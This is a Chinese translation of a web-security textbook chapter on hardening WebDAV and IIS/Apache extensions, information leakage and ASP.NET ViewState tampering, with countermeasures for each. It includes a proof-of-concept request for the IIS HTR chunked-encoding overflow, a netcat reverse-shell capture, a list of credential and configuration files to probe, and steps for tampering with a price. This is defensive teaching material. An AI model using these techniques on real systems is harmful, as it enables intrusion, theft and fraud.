配置 WebDAV 是很烦人的，因为出于一些原因，它常常要和标准的 Web 服务器扩展分开配置。在下面，我们列出了在 IIS 和 Apache 上配置 WebDAV 的标准操作流程。注意，WebDAV 有多种实现，为了达到最好的效果，你应该参考你的 WebDAV 软件提供商的文档。

在 Apache 上加固 WebDAV 配置 在 Apache 上, 对 WebDAV 的控制很大程度上取决于你已经安装的特定的 DAV 软件模块。下面这个例子显示了在 mod_dav 上（其链接参见“参考和进一步阅读”），通过添加下列内容到 Apache 配置文件（比如 httpd.conf）中来禁止特定的 WebDAV 方法。

<Limit PROPFIND PROPPATCH LOCK UNLOCK MOVE COPY MKCOL PUT DELETE>
Order allow, deny
Deny from all
</Limit>
A better method is to use the Limit method to remove all but necessary methods:
<Directory /usr/local/apache/htdocs>
<Limit GET POST OPTIONS>
Order allow, deny
Allow from all

</Limit>
<LimitExcept GET POST OPTIONS>
Order deny, allow
Deny from all
</LimitExcept>
</Directory>

当然，你也可以通过确保在你的 Apache 配置文件中，不在<Directory>或<Location>指示中出现“DAV On”指示，从而关闭整个 WebDAV。默认情况下，WebDAV 是关闭的，这些指示行是没有的。

在 IIS 上加固 WebDAV 配置 在 IIS 5.x 上，微软知识库文章 241520 描述了如何禁用 WebDAV（对该文章的链接请参见“参考和进一步阅读”）。下面是从 KB 241520 中摘抄的内容。

1. 启动注册表编辑器（Regedt32.exe）。

2\. 寻找并单击注册表的下列键值:

HKLM\SYSTEM\CurrentControlSet\Services\W3SVC\Parameters

3. 在 “编辑” 菜单中，单击 “新建”，然后添加下列注册表值：

名称：DisableWebDAV

类型：DWORD

数据：1

4. 重启 IIS。该改动在 IIS 服务或服务器重启后才会生效。

当发布 IIS 6.0 时，Microsoft 终于解决了这个问题。首先，WebDAV 默认是禁用的。其次，启用或禁止 WebDAV 非常简单。你只要打开 IIS 管理器（%systemroot%\\system32\\inetsrv\\iis.msc），选择“Web 服务扩展”，然后选择“WebDAV”并单击“禁用”按钮，如图 9-1 所示。

### 9.3 管理员错误配置

本节将讲述通常由于 Web 管理员缺乏意识或不够仔细而引入的漏洞。不过幸运的是，他们可以做一些事情来立即弥补。我们将讲述下列几类常见配置漏洞：

☐ 不必要的 Web 服务器扩展

信息泄漏

 </div>

#### 9.3.1 不必要的 Web 服务器扩展

在我们最近的印象里，一些最严重的 Web 平台攻击，都是由扩展 Web 服务器的基本 HTTP 功能的插件模块中的软件缺陷而引起的。很多空前的攻击，包括 IISHack，.printer 和.ida（Code Red 蠕虫就是基于该漏洞）等 IIS 攻击，都属于 Web 平台攻击。Apache 遇到了同样的问题，比如 mod_ssl 引发了 Slapper 蠕虫。我们在第 3 章中演示了攻击这些漏洞是多么的轻而易举。

“确实很恐怖，”你可能会这样自言自语，“但它们不是都与软件缺陷相关吗？怎么说和错误配置有关呢？”我们在这里引入该讨论的原因，是为了强调我们认为在 Web 平台配置中最严重——也是最常见的漏洞：启用不正确的和不必要的 Web 服务器扩展。因此，一个 Web 服务器上的这些扩展是否可用，直接由 Web 服务器管理员控制（即使它们是默认安装的），因此在这里进行讨论。我们将给出两个例子，包括基本 Web 扩展模块（比如 HTR 编码问题）和 WebDAV。

IIS HTR Chunked 编码堆溢出

   </div>

如果将这些扩展留给爱窥探的人会发生什么样后果？我们回顾一下历史，就能发现一个很好例子：微软 IIS HTR Chunked 编码堆溢出

在 2002 年 6 月，eEye Digital Digital 宣布在 IIS Web 服务器处理.htr 文件的扩展里，发现了一个缓冲区溢出。微软使用动态链接库（Dynamic Link Library，DLL）来扩展它的 Web 服务器，这个特定扩展的默认位置位于 %systemroot%\System32\ism.dll。HTR 是 Microsoft 的首次脚本构架的尝试，已经被 ASP 替代很久了。但是，由于多方面的原因，HTR 功能到今天仍装载在 IIS 中（虽然在 IIS 6 中默认是禁止的）。

该漏洞在 HTR 扩展处理 Chunked 编码时出现。几乎同时，HTR 堆溢出也被发现了。在很多商家的 Web 服务器里发现了许多 Chunked 编码漏洞。Chunked 编码是 HTTP 规范定义的一个选项，客户端用来协商即将发到服务器的 “chunk” 数据的大小。HTR DLL 有一个编程缺陷，导致低估了存放客户端所指定 chunk 数据所需要的缓冲区大小，从而允许一个恶意请求溢出缓冲区，并在堆（不是堆栈）上加载攻击代码。

概念验证攻击代码的 HTTP 请求如下所示:

POST /file.htr HTTP/1.1
Host: victim.com
Transfer-Encoding: chunked
20
XXXXXXXXXXXXXXXXXXXXXXBUFFER000
[enter]
[enter]

这里要注意的关键点是对某个.htr 文件的请求。注意，这个文件不必真正存在，它只需把请求转到有漏洞的 HTR 扩展。当然，你必须在 HTTP 头里指定 Chunked 编码选项，并最终发送正确的缓冲区。这是非常经典的 IIS 缓冲区溢出攻击：瞄准正确的 DLL，确保所有的附加 HTTP 头都被包含（就像我们在这里看到的一样，Host:header 经常是必要的），然后瞄准一大片缓冲区数据来溢出代码。

而且,就像很多这样的漏洞一样,大量公开的漏洞利用代码在 Internet 上很快就出现了。大部分 POC 攻击代码都是发送一个特殊构造的缓冲区数据,该数据会给攻击者的系统返回一个命令行 Shell。攻击者所需要做的事情就是在自己系统上的预定义端口上建立一个接收者,“捕获”来自受害服务器返回的命令行 Shell。在下面这个例子中,我们演示了使用 Netcat 工具,在 4003 端口上“捕获”来自漏洞服务器的 Shell。

C:\\>nc -l -vv -p 4003

listening on [any] 4003 ...

connect to [192.168.234.34] from MIRAGE [192.168.234.119] 3056

Microsoft Windows 2000 [Version 5.00.2195]

(C) Copyright 1985-2000 Microsoft Corp.

C:\\WINNT\\system32>

C:\\WINNT\\system32&gt;whoami

whoami

MIRAGE\\IWAM_MIRAGE

你这里看到的命令提示是一个在受害者机器上的远程控制会话，该受害机是192.168.234.119（主机名：MIRAGE）。我们执行了Windows Server Resource Kit的whoami工具，来显示该Shell的运行上下文是低权限的Windows IWAM账号，这是IIS 5机器上默认拥有的账号。如果是在IIS 4机器上，我们会作为超级权限的LocalSystem账号运行，因为在那个版本上，HTR默认以更高权限的进程运行。

#### Web 服务器扩展对抗措施

我们希望这个小例子已经解释清楚了这样一条原则：你能够为 Web 平台所做的最重要的配置，就是禁用所有不必要的插件/扩展模块。IS 6 就是最好的说明，它以前受到插件扩展所带来的各种各样的问题困扰，但是现在在安装时把所有的扩展都禁止了。如果 Microsoft 赞同这种做法，认为禁用扩展是重要的，而且他们已经发现了一种方法可以禁止扩展，又不影响他们涉及几亿美元销售软件功能的业务，那么你也可以这样做。下面是在主流 Web 服务器（在写本书的时候的主流 Web 服务器）IIS 和 Apache 上，如何删除不必要的扩展的方法。

禁止 IIS 上的扩展 为了在 IIS 5 上禁用不需要的扩展，按如下步骤操作：

1. 打开 IIS 管理工具（运行 iis.msc）

2．右击你希望管理的电脑，选择“属性”|“主属性”|“WWW服务”，然后单击“编辑”，选择“默认Web站点的属性”|“主目录”|“应用程序设置”|“配置”|“应用程序映射”。

3．在该最终界面上，删除对期望扩展的映射，图9-2显示了选中了映射到 msw3prt.dll 的.printer。

在 IIS 6 上，也是使用 IIS 管理工具，但是注意在这个版本中，微软把映射整理到 “Web 服务扩展” 节点下了。在这个界面上，只需选择你希望禁止的扩展，然后单击 “禁止” 按钮即可。

 </div>

禁止 Apache 上的模块 为了禁用 Apache 中的模块，在编译前使用配置脚本，传入需要禁止的所有模块。不同版本的 Apache 的配置脚本语法如下所示：

注意 该方法适合删除 Apache 中的插件模块，不适用于动态模块。

#### 9.3.2 信息泄漏

我们将讨论的下一类常见配置问题是非常广泛的。它是一组问题，会泄漏应用程序拥有者并不愿意泄漏的信息，常常被攻击者利用来对 Web 应用进行更有效的攻击。这些问题并不是来源于任何特定的 Web 服务器扩展或插件模块，而是来自很多不同的配置参数，因此这里我们把它们分成一组来作单独的处理。在本节中，我们将讨论的特定漏洞包括：

☐ 文件、路径和用户泄漏

☐ 状态页面信息泄漏

文件、路径和用户泄漏

流行度：9
简单度：2
影响度：5
风险度：6

Web 站点信息泄漏的最常见原因之一是那些散落在服务器根目录下的文件和其他内容，这是由于糟糕的文件管理造成的。当 Web 服务器和应用程序最开始作为产品发布时，通常所有东西都是干净的——文件和目录结构是一致的。但随着时间的推移，应用程序被改变和更新，配置也被修改，Web 根目录开始变得混乱起来。文件开始被到处放置。文件夹和旧的应用程序被遗忘。这些被忘记和忽略的文件可能是珍宝，为攻击者提供非常有用的信息。有很多方法可以用来发现这些信息，我们将在下面进行讨论。

HTML 源代码 通常，攻击者首先查看的地方是很容易看得到的 Web 应用/站点页面的 HTML 源代码。HTML 源代码可以在注释里，在包含文件（查找.inc 文件扩展名）里等等，包含各种有价值的信息（搜索“<!—”标记），因为源代码主要是 Web 开发者的研究领域，因此我们将在后面的“开发者造成的错误”中讨论一些关键例子。

目录猜测 第一个方法是最简单的——用 Web 结构中通常存在的常见目录名列表来猜测名字。举个例子，我们知道很多 Web 站点都有 “admin” 目录。因此，通过简单的猜测并请求 http://www.site.com/admin/，攻击者可以发现他们能查看 Web 站点的管理界面。我们在表 9-3 中列出了文件和文件夹名字猜测所产生的最常见的 HTTP 响应码。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>状态码</td><td style='text-align: center; word-wrap: break-word;'>意义</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>HTTP/1.1 200 OK</td><td style='text-align: center; word-wrap: break-word;'>在大多数 Web 服务器上，这表示该目录存在并返回默认页面</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>HTTP/1.1 403 OK</td><td style='text-align: center; word-wrap: break-word;'>403 禁止访问意味着该目录是存在的，但不允许查看内容，并不是你不能访问目录的内容。记住，这是很重要的</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>HTTP/1.1 401 OK</td><td style='text-align: center; word-wrap: break-word;'>401 响应指出该目录是被认证保护的。对你来说这是个值得记下的好消息，因为这意味着目录的内容是十分重要而需要保护</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>HTTP/1.1 302 OK</td><td style='text-align: center; word-wrap: break-word;'>302 响应是一个到其他 Web 页面的重定向。根据 Web 服务器的配置，有时 302 响应意味着成功，而在一些情况下，你只是被重定向到一个错误页面</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>HTTP/1.1 404 Object Not Found</td><td style='text-align: center; word-wrap: break-word;'>404 意味着该页面在服务器上不存在</td></tr></table>

注意 关于 HTTP 状态码的信息，可以在本章末尾的“参考和进一步阅读”一节中找到其链接。

让我们逐步看一个目录猜测攻击的例子，以此来说明一些关键点。我们首先在目标的Web根目录中发现了一个文件夹，它带有常见的名字“stats”。当我们尝试访问该文件夹时，我们收到了友好的403禁止访问的响应：“目录列表拒绝——该虚拟目录不允许列举内容”。

该响应并不意味着目录是被保护的，只是我们不能查看其文件列表而已。这意味着如果某个文件的确在目录中存在，我们仍然可以访问它。我们需要做的事情就是一些基础的推理和猜测工作。现在我们需要像站点的管理员那样思考。管理员会在一个叫做“stats”的目录中放置什么呢？莫非是 Web 统计（statistics）？我们作进一步的调查，在 Google 中

输入搜索查询 inurl:/stats/+"index of"，来确定其他站点在它们“stats”目录中的常见文件。我们了解到，该目录中最常见的文件名是“stats.html”，这一点都不令人感到惊讶。当对 http://www.site.com/stats/stats.html 发起请求时，程序给我们返回了一个带有该站点 Web 统计的成功结果。我们的下一步是查看该 URL，看是否可以发现什么令人感兴趣的东西。如图 9-3 所示，我们发现了一些关于站点的潜在的有价值的信息。点击次数的统计可能不会给攻击者提供太多的帮助，但“stats”目录常包含有潜在危害的信息，比如日志文件、证书重置脚本、账号选项、配置攻击等等。

常见文件名猜测 就像我们在先前提到的那样，Web 站点管理员因把旧的代码、过时的文件和其他不应该在那里的东西遗忘在 Web 根目录而声名狼藉。而你希望利用他们的怠惰来获得好处。很多管理员没有认识到这些文件可以像 Web 站点上其他文件一样被下载下来。攻击者需要知道它们放的地方以及它们的名字。此类攻击比你想象的要简单得多，这对理解 Web 服务器攻击和防范两者都很重要。

 </div>

注意 我们会在接下来的“开发者造成的错误”一节中，讨论 IIS 上包含（.inc）文件的特殊情况。

举个例子, 很多开发者都使用流行的源代码控制系统 CVS（Concurrent Versions System，并发版本系统）。在多人合作开发一个软件时，使用该软件能很方便地管理软件版本。CVS 会搜索整个目录结构，源代码会保存和添加到自己的/CVS/子目录中。该子目录包含三个文件——Entries，Repository 和 Root——CVS 用来控制该目录中的源代码的变化。一个 CVS 源代码树例子如下所示：

/WebProject/
/WebProject/File1.jsp
/WebProject/File2.jsp
/WebProject/CVS/Entries
/WebProject/CVS/Repository
/WebProject/CVS/Root
/WebProject/Login/Login.jsp
/WebProject/Login/Fail.jsp
/WebProject/Login/CVS/Entries
/WebProject/Login/CVS/Repository
/WebProject/Login/CVS/Root

一旦应用程序完成后，很多使用 CVS 进行 Web 开发的公司会如何处理呢？开发者或 Web 管理员会把整个/WebProject/目录上传到 Web 服务器上去。现在，所有的 CVS 目录都在公开的 Web 根目录中，很容易通过 http://www.site.com/CVS/Entries 访问，而且还会返回该目录中所有文件的列表，这些文件是受到源代码控制的，如图 9-4 所示。

 </div>

另一个常见的文件猜测目标来自流行的 FTP 客户端 WS_FTP。该程序在文件上传的每个目录中,都留下一个叫做 WS_FTP.LOG 的文件(比如,http://www.site.com/WS_FTP.LOG)。该日志列出了上传的每个文件。表 9-4 显示了当攻击者检查一个站点时,经常寻找的文件。记住,攻击者是不会在他们的搜索中放过一个目录或子目录的。

提示 对于表 9-4 中列出的很多文件名，简单地在末尾添加 ".old" , ".backup" 和/或 ".bak" 也能够暴露文件的版本是否是当前的，例如，global.asa.bak 或 global.asa.old。

网站时光倒流机器（Wayback Machine）方法 Web 站点和应用程序处于一个不断改变的状态，开发人员经常会修补它们的架构和设计。同样的，根据不同的 Web 站点，他们有两种方法实现更新。一种是他们一次性开发出整个新的 Web 站点，并把整个包移动到产品服务器上去；另一种是他们逐步地用新开发出的产品部分更新站点。很多时候，当新站点在运行时，机构会把它们以前所有的代码迁移到一个备份位置，然后就把它们遗忘了。该旧代码备份是一个非常严重的安全薄弱点。让我们考虑这样一个从 ASP 平台升级到 ASP.NET 平台公司。通过使用 ASP.NET，该公司能够设计和创建更鲁棒和更安全的平台。他们用心地完成了他们的职责，测试了他们新应用程序的安全漏洞，并宣称它们是安全的。但是，当他们升级到 ASP.NET 时，他们把整个原来的 ASP 应用移动到一个叫做 backup 的 Web 根目录下。大错特错！现在，一个攻击者发现了这个文件夹，并正确地判断出这里保存着该机构旧的 Web 站点版本。我们的黑客来到 http://Web.archive.org（Wayback Machine），这是一个完整保存 Web 站点内容的网站，如图 9-5 所示。

 </div>

攻击者现在输入站点的 Web 地址，浏览整个站点并细心地留意所遇到的页面名字和表单。他点击了一个看起来是动态的表单：http://www.site.com/article.asp?id=121879，并列出文章的内容。

有了该信息的帮助，攻击者回到原来的站点，尝试访问该页面 http://www.site.com/backup/article.asp。他的聪明得到了回报。不仅能看到 Web 页面，而且也从公司数据库里获取了数据。我们的黑客笑了，因为他发现了旧的应用程序是带有 SQL 注入漏洞的，可以通过备份的内容访问数据库。

其他常用来识别旧 Web 站点内容的技巧，还包括使用 Google 搜索返回 Web 页面的缓存。有时使用站点自己的搜索引擎，也会返回非常有用的旧文件。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>文件名</td><td style='text-align: center; word-wrap: break-word;'>描述</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/etc/passwd</td><td style='text-align: center; word-wrap: break-word;'>UNIX/Linux 密码文件</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/winnt/repair/sam._</td><td style='text-align: center; word-wrap: break-word;'>Windows 备份 SAM 数据库</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Web.config</td><td style='text-align: center; word-wrap: break-word;'>一个 ASP.NET 配置文件，可能会包含密码</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Global.asa</td><td style='text-align: center; word-wrap: break-word;'>一个 IIS 数据库配置文件</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/W3SVCx/</td><td style='text-align: center; word-wrap: break-word;'>对虚拟 Web 根目录的常见命名习惯</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/stats/</td><td style='text-align: center; word-wrap: break-word;'>站点统计目录，通常是隐藏的</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/etc/apache/httpd.conf</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/usr/local/apache/conf/httpd.conf</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/home/httpd/conf/httpd.conf</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/opt/apache/conf/httpd.conf</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>htaccess</td><td style='text-align: center; word-wrap: break-word;'>Apache 密码文件。</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/usr/netscape/suitespot/httpsserver/</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>config/magnus.conf</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/opt/netscape/suitespot/httpsserver/</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>config/magnus.conf</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>etc/apache/jserv/jserv.conf</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/usr/local/apache/conf/jserv/</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>jserv.conf</td><td style='text-align: center; word-wrap: break-word;'>Apache JServ 配置</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/home/httpd/conf/jserv/jserv.conf</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/opt/apache/conf/jserv/jserv.conf</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>core</td><td style='text-align: center; word-wrap: break-word;'>核心转储。如果里仔细观察，核心转储能够泄漏非常有意义的信息。</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>WS_FTP.LOG</td><td style='text-align: center; word-wrap: break-word;'>你会经常发现它们</td></tr><tr><td colspan="2">传的每个文件以及位置</td></tr></table>

续表

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>文件名</td><td style='text-align: center; word-wrap: break-word;'>描述</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>&lt;name of site&gt;.zip</td><td style='text-align: center; word-wrap: break-word;'>很多站点在它的根目录中，有一个所有设置信息的压缩包。因此访问www.site.com.tar.gz 可能得到一个包含了所有东西的压缩包</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>README, Install, ToDO, Configure</td><td style='text-align: center; word-wrap: break-word;'>所有人都会随意放置应用程序的文档。找到README文件，并发现使用的是什么应用程序和那里访问它们</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Test.asp, testing.html, Debug.cgi</td><td style='text-align: center; word-wrap: break-word;'>一旦发现了测试脚本，通常你根本不知道你会从它们的内容中找到什么。它可能是一页垃圾，也可能是如何运行管理任务的详细信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Logs.txt, access_log, debug.log, sqlnet.log, ora_errs.log</td><td style='text-align: center; word-wrap: break-word;'>日志文件总是被遗忘。如果 Web 服务器运行的是 Oracle，十有八九你会在某处找到 sqlnet.log</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Admin.htm, users.asp, menu.cgi</td><td style='text-align: center; word-wrap: break-word;'>如果你发现了一个管理目录，但是没有发现文件，试着猜测一下。寻找对应管理功能的文件</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>*.inc</td><td style='text-align: center; word-wrap: break-word;'>由于错误的配置，包含文件在 IIS 上常常是可下载的</td></tr></table>

用户枚举 默认情况下，Apache 允许通过 “~” 语法确认用户在 Web 服务器上的主目录。因此，通过发送诸如 http://www.site.com/~root 或 http://www.site.com/~asimons 的请求，可以轻松地识别合法的用户名。这对你的识别非常有用，举个例子，系统上存在一个 Oracle 用户，可以使得攻击者执行一些有趣的 Oracle 攻击。一旦攻击者知道了后端使用的数据库类型，用诸如盲 SQL 等方法检查漏洞会更加简单。

注意 SQL 注入漏洞和其他 Web 数据库漏洞在第 8 章中讨论。

#### ☑ 文件泄漏的对抗措施

修补该安全问题很简单：只要保持你的站点目录整洁并实行正确的访问控制，特别是对根目录（/）的访问控制。特别的，任何人都可以访问 Web 根目录中的任何内容，因此这是你需要严格检查的地方。

- 把你的 Web 根目录配置在另一个卷中。这在 IIS 系统上是特别重要的，因为曾经发生过很多攻击突破 Web 根目录的事件，它们进入 %systemroot% 中运行功能强大的文件，比如 Windows 32 位命令行 shell，cmd.exe。

- 把 backups/archives/old 文件移动到一个单独的文件夹，而且只要有可能，就移出 Web 站点/应用程序的目录结构。如果由于一些原因不能这样做，那么就要对保存敏感文件的文件夹进行访问认证。

不要把文件夹和文件命名成容易猜测的名字。比如，你不要把数据目录命名成“data”。

- 为了防范攻击者使用容易猜测的“~”语法进行用户名枚举，请编辑 Apache 的 httpd.conf 文件，确认“UserDir”配置被设为禁用。

☐ 对存放重要数据的所有文件夹都用认证保护。

可能避免文件泄漏漏洞的最佳办法，是假设攻击者可以看见站点的整个目录结构，避免“通过隐匿实现安全”。无论什么时候，你发现自己在想“没人会猜到我在这里有个文件”时，请记住：肯定有人会猜到的！

#### 状态页面信息泄漏

流行度：5
简单度：1
影响度：3
风险度：5

Apache 曾经拥有一个默认可访问的状态页面。这些页面提供了关于服务器和连接的大量有用信息。现在这些页面在默认情况下是禁用的，但是仍有大量的配置开启了该特性。找到该状态页面非常简单，在可能有漏洞的 Web 站点上发送下列的请求：

o http://www.site.com/server-info

o http://www.site.com/server-status

o http://www.site.com/status

下面的例子显示的是对这些请求可能会出现的服务器状态页面。

##### Apache Server Status for www.apache.org

Server Version: Apache/2.0.54 (Unix) mod_ssl/2.0.54 OpenSSL/0.9.7a DAV/2 SVN/1.2.0-dev
Server Built: Apr 12 2005 16:09:05
Current Time: Wednesday, 21-Sep-2005 20:52:23 CEST
Restart Time: Thursday, 25-Aug-2005 17:56:30 CEST
Parent Server Generation: 27
Server uptime: 27 days 2 hours 55 minutes 53 seconds
Total accesses: 106433456 - Total Traffic: 3963.8 GB
CPU Usage: u480.996 s276.233 eu1438.56 cs0 - .0937% CPU load
45.4 requests/sec - 1.7 MB/second - 39.1 kB/request
180 requests currently being processed, 175 idle workers

与目前为止我们讨论的大部分 Apache 漏洞一样，修复状态页面信息泄露也很简单，只用修改 Apache 服务器配置文件 httpd.conf，添加下列配置：

<Location /server-info>
SetHandler server-info
Order deny, allow
Deny from all

Allow from yourcompany.com
</Location>

<Location /server-status>
SetHandler server-status
Order deny, allow
Deny from all
Allow from yourcompany.com
</Location>

### 9.4 开发者造成的错误

到现在为止，我们主要讨论的一般是在 Web 应用/站点管理员范围内的配置问题。我们接下来将改变一下，讨论一些属于 Web 开发者责任的漏洞（但两者的界线有点模糊不清，就像你将在下面“包含文件”讨论中看到的那样）。

开发者造成的配置错误和管理员造成的配置错误相比，严重程度至少是一样的。事实上，因为 Web 开发和应用/站点的自身结构的联系十分紧密（比如，文件的位置和访问控制配置），Web 开发者和管理员经常是同一个人，或者在大一点的商业站点中，是在同一组织内密切合作的人。这创建了一种“合谋”效应，使得松懈的安全存在于整个站点/应用中。我们一会儿将展示一些例子。

在我们开始前，希望强调下 Web 平台的选择对漏洞的影响。我们引用这里的 Microsoft 的 ASP.NET ViewState 的方法，来说明开发环境的选择，特别是默认配置的问题，会将站点或应用程序暴露在该平台常见的漏洞下。

包含文件信息泄漏

流行度：8
简单度：2
影响度：7
风险度：8

在 IIS 5.x 中，Web 服务器对未知扩展名类型的默认操作，是返回明文文件给用户。举个例子，如果一个文件名叫 test.ars，位于 Web 根目录中。那么无论何时从浏览器请求该文件，都将出现一个下载提示。这是因为 ARS 扩展不是诸如 ASP 和 HTML 之类的已知文件类型。这看起来不引人注意的默认设置，会导致严重的信息泄漏，其中最常见的一种是能够下载叫做包含文件的.inc 文件。

什么是包含文件？当开发者在 ASP 中编程时，他们通常把常用的功能库放到一个包含文件中，这样他们可以在该站点/应用程序的其他地方方便地调用。包含文件的位置通常可以在 HTML 源代码中或者通过之前讨论的文件/路径泄漏漏洞来找到。下面是一个来自 HTML 源码中注释的例子，取自于我们最近审计的一个站点。

<!-- #include virtual ="/include/connections.inc" -->

通过路径和文件名的帮助，攻击者现在可以通过浏览 http://www.site.com/include/connections.inc 方便地请求包含文件本身了。

哦，响应包含了文件所有的源码，也包括数据库的用户名和密码！

<
    ' FileName="Connection_ado_conn_string.htm"
    ' Type="ADO"
    ' DesigntimeType="ADO"
    ' HTTP="false"
    ' Catalog=" "
    ' Schema=" "
Dim MM_Connection_STRING
MM_Connection_STRING = "Driver={SQL Server};Server=SITE1;Database=Customers;UID=sa;Pwd=sp1Int3nze!;"
%>

注意 该 Web 服务器以 SA 身份登录，真是糟糕的做法！

另外，攻击者现在也知道了该应用/站点的包含文件目录，可以开始猜测其他潜在的敏感包含文件的名字，希望可以下载到更加敏感的信息。

#### ☐ 包含文件的对抗措施

有上、中、下三策可以解决这个烦人的问题。

下策 把所有的.inc 文件移到 Web 应用/站点结构之外，这样它们就不能通过标准的请求访问。该解决方案可能对已存在的大型 Web 应用程序是不可行的，因为应用代码中所有的路径名，都需要改变成文件对应的新位置。另外，它不能防止后来的 inc 文件因为开发人员的懒惰或者缺乏安全意识，而被放在不正确的位置。

中策 把所有的.inc 文件重命名为.inc.asp。这会强迫.inc 文件在 ASP 引擎内运行，这样它们的源代码就不会发给客户端。

上策 把.inc 扩展关联到 asp.dll，这会强迫.inc 文件在 ASP 引擎内运行，它们的源代码就不会发给客户端。这比移动文件或重命名为.asp 更好，因为不管将来是因为懒惰还是

缺乏意识，任何不小心命名成.inc的文件都不再是一个问题了。

注意 在过去，Microsoft 的 ASP 引擎存在漏洞，导致对一些文件类型会造成信息泄漏。虽然微软在很早前就已经修复这些问题了，但你从不会真正地了解，运行那些并非设计来直接运行的代码会导致怎样的效果。混合使用几种刚才描述的方法，来保证深度的防御可能是最好的办法。

#### 攻击 ViewState

流行度：5

简单度：5

影响度：7

风险度：6

ViewState 是一个 ASP.NET 方法，用来维持 ASP.NET Web 页面中所有项目的状态信息（关于 ViewState 更多信息的链接，请参见“参考和进一步阅读”）。在 ASP 老板本中，当一个 Web 表单提交到服务器时，所有表单的值都清空了。当在 ASP.NET 中提交同样的表单时，表单的状态或“ViewState”会被保持不变。我们都遇到过这样的情况，当填完一个很长的应用或 Web 表单后提交，收到一个错误消息，就会发现输入的所有信息都被清空了。这通常会在一个字段被留成了空白，或者没有遵循应用程序期望的结构时发生。应用程序没有维持提交表单的“状态”。而 ViewState 的目标就是通过保存刚才提交给服务器的表单内容来解决这个问题——如果在一个字段里有一个错误或不期望的值，用户只需改正该值，而表单其余的字段保持不变。

ViewState 也可以用来保持其他应用程序值的状态。很多开发者在 ViewState 中保存敏感信息和整个对象，但是如果 ViewState 被篡改，该措施会造成严重的安全问题。

该问题的一个很好例子是 Microsoft 参考应用程序中叫 Duwamish 7.0 的应用（其链接参见“参考和进一步阅读”）。Duwamish Books 是一个在线购书 Web 应用例子。图 9-6 显示了 Duwamish Books 的基本外观。注意，《如何赢得朋友和影响他人》（“How to Win Friends and Influence People”）一书仅花$11.99 即可购得。

 </div>

查看页面源代码，如图 9-6 所示，这暴露了隐藏的 ViewState 字段。它会在单击 “添加到购物车” 按钮和提交页面表单内容时发送。隐藏的 ViewState 字段在图 9-7 中，用黑颜色突出显示。

 </div>

就像你看到的那样，ViewState 的值是经过编码了的。虽然要从显示的值中得知 ViewState 采用的是什么编码算法比较困难,但是大部分 Web 技术使用的都是 Base64 编码,因此猜测这里使用的是 Base64 可能是一个有把握的猜测。为了查看 ViewState 的属性,我们对其值运行一个 Base64 解码器。其结果如图 9-8 所示。

 </div>

对于图 9-9 中 ViewState 解码后的值，这里有两件事情需要注意：

- 价格$11.99 被保存在 ViewState 中。

o ViewState 没有经过哈希。这一点你可以通过解码后字符串的最末尾是一个右尖括号

（>）而推断出来。一个经过哈希的 ViewState，在字符串的最后有一些随机字节，看起来像这个样子：<:Xy'y_w_Yy/FpP。

因为该 ViewState 是没有经过哈希的，任何对 ViewState 的改变都会被 Web 应用程序接受。攻击者可以把价格$11.99 修改为$0.99，然后把 ViewState 编码回 Base64 并提交请求到服务器。该请求看起来如图 9-9 所示。

 </div>

服务器的响应如下所示，表明了该书被人按照攻击者设定的价格$0.99购买了。

#### ☐ 针对攻击 ViewState 的对抗措施

首先，不要在 ViewState 中保存任何东西。让 ViewState 做它自己的工作，而不要打扰它。这是防止攻击者使用它干扰你的用户的最简单方法。

Microsoft 提供了对 ViewState 标记进行密钥哈希的功能。当收到该哈希时会做检查，以确保 ViewState 在传输过程中没被改变。该 ViewState 完整性验证机制可以是默认启用的，这取决于你的 ASP.NET 的版本。如果不是默认启动，你可以通过添加下面几行代码到应用程序的 Web.config 文件来启用完整性检查（ViewState 完整性检查的启用如加粗的文本所示）：

<pages buffer=" (true|false) " enableViewStateMac="true"/>
<machineKey validationKey=" (minimum 40 char key) " decryptionKey="AutoGenerate" validation="SHA1"/>

